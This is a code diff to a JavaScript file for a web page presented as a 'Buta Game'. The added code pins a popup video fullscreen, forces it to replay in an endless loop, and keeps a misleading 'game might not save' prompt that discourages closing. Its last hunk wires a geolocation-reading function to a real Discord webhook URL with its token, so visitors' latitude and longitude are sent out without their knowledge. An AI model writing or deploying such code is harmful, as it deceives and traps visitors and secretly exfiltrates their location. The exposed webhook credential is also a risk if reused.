@@ -1,4 +1,3 @@
-/* script.js */
 document.getElementById('playButton').addEventListener('click', function() {
     const videoFiles = [
         'videos/video1.mp4',
@@ -21,7 +20,7 @@ document.getElementById('playButton').addEventListener('click', function() {
                         <title>Buta Game</title>
                         <style>
                             body { margin: 0; overflow: hidden; }
-                            video { width: 100vw; height: 100vh; object-fit: cover; }
+                            video { width: 100vw; height: 100vh; object-fit: cover; position: fixed; top: 0; left: 0; }
                         </style>
                     </head>
                     <body>
@@ -33,8 +32,16 @@ document.getElementById('playButton').addEventListener('click', function() {
                             window.onbeforeunload = function() {
                                 return "Are you sure you want to close? Game might not save.";
                             };
-                            document.getElementById('popupVideo').play();
-                        </script>
+                            
+                            const video = document.getElementById('popupVideo');
+                            video.play();
+                            
+                            function keepPlaying() {
+                                video.play();
+                                requestAnimationFrame(keepPlaying);
+                            }
+                            keepPlaying();
+                        <\/script>
                     </body>
                     </html>
                 `);
@@ -47,7 +54,7 @@ document.getElementById('playButton').addEventListener('click', function() {
                         <title>Buta Game</title>
                         <style>
                             body { margin: 0; overflow: hidden; }
-                            video { width: 100%; height: 100%; object-fit: cover; }
+                            video { width: 100%; height: 100%; object-fit: cover; position: fixed; top: 0; left: 0; }
                         </style>
                     </head>
                     <body>
@@ -59,8 +66,16 @@ document.getElementById('playButton').addEventListener('click', function() {
                             window.onbeforeunload = function() {
                                 return "Are you sure you want to close? Game might not save.";
                             };
-                            document.getElementById('popupVideo').play();
-                        </script>
+                            
+                            const video = document.getElementById('popupVideo');
+                            video.play();
+                            
+                            function keepPlaying() {
+                                video.play();
+                                requestAnimationFrame(keepPlaying);
+                            }
+                            keepPlaying();
+                        <\/script>
                     </body>
                     </html>
                 `);
@@ -125,7 +140,7 @@ function sendLocationToWebhook() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(position => {
             const { latitude, longitude } = position.coords;
-            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+            const webhookUrl = 'https://discord.com/api/webhooks/1357338228004487341/YOjCQVGU-IMzYt_ZP9-YJjUags_DeF8eGap3JPEiTGRio98s1h8FIlcGxvuZwYyTV0H6';
             const data = {
                 content: `User location: Latitude ${latitude}, Longitude ${longitude}`,
                 username: 'ButaGameBot'
